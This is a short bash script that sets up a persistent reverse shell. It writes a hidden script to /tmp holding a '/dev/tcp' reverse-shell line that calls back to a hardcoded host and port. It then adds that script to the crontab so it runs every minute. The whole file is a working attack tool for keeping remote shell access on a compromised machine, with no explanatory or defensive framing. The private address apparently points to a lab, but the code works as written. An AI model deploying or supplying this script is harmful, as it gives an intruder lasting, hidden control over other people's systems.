#!/bin/bash

# Configuration
RHOST="192.168.230.133"  # Remote host IP
RPORT="9999"             # Remote host port
CRON_INTERVAL="* * * * *" # Cron job interval (every minute)

# Create the reverse shell script
cat <<EOF > /tmp/.rev_shell.sh
#!/bin/bash
bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
EOF

# Make the script executable
chmod +x /tmp/.rev_shell.sh

# Add the script to crontab
(crontab -l 2>/dev/null; echo "$CRON_INTERVAL /tmp/.rev_shell.sh") | crontab -
